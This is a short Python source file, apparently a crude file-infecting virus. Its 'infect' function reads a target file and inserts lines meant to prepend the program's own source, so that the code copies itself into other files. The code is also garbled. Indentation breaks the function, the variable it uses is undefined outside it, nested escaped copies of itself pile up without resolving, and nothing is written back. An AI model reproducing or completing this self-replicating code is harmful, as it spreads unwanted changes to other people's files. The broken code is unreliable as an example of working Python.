import os 
import shutil

def infect(file_path):
 with open(file_path, "r") as f: lines = f.readlines()

lines.insert(0, "import os\nimport shutil\n")
lines.insert(1, "def infect(file_path):\n")
lines.insert(2, "    with open(file_path, \"r\") as f:\n")
lines.insert(3, "        lines = f.readlines()\n")
lines.insert(4, "    lines.insert(0, \"import os\\nimport shutil\\n\")\n")
lines.insert(5, "    lines.insert(1, \"def infect(file_path):\\n\")\n")
lines.insert(6, "    lines.insert(2, \"    with open(file_path, \\\"r\\\") as f:\\n\")\n")
lines.insert(7, "    lines.insert(3, \"        lines = f.readlines()\\n\")\n")
lines.insert(8, "    lines.insert(4, \"    lines.insert(0, \\\"import os\\\\nimport shutil\\\\n\\\")\\n\")\n")
lines.insert(9, "    lines.insert(5, \"    lines.insert(1, \\\"def infect(file_path):\\\\n\\\")\\n\")\n")
lines.insert(10, "    lines.insert(6, \"    lines.insert(2, \\\"    with open(file_path, \\\\\\\"r\\\\\\\") as f:\\\\n\\\")\\n\")\n")
lines.insert(11, "    lines.insert(7, \"    lines.insert(3, \\\"        lines = f.readlines()\\\\n\\\")\\n\")\n")
lines.insert(12, "    lines.insert(8, \"    lines.insert(4, \\\"    lines.insert(0, \\\\\\\"import os\\\\\\\\nimport shutil\\\\\\\\n\\\\\\\")\\\\n\\\")\\n\")\n")
lines.insert(13, "    lines.insert(9, \"    lines.insert(5, \\\"    lines.insert(1, \\\\\\\"def infect(file_path):\\\\\\\\n\\\\\\\")\\\\n\\\")\\n\")\n")